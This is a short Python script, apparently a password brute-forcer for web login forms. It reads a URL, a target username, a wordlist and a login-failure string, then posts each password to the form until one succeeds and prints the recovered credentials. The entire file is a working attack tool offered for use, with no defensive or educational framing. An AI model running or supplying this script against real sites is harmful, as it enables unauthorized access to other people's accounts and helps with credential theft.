import requests


url = input('[+] Enter page URL: ')
username = input('[+] Enter username for the account to Bruteforce: ')
password_file = input('[+] Enter password file to use: ')
login_failed_String = input('[+] Enter String that occurs when login fails: ')


def cracking(username, url):
    for password in passwords:
        password = password.strip()
        print('Trying: ' + password)
        data = {'username':username, 'password':password, 'Login':'submit'}
        response = requests.post(url, data=data)
        if login_failed_String in response.content.decode():
            pass
        else:
            print('[+] Found Username: ==> ' + username)
            print('[+] Found Password: ==> ' + password)
            exit()


with open(password_file, 'r') as passwords:
    cracking(username, url)

print('[!!] Password not in list!');
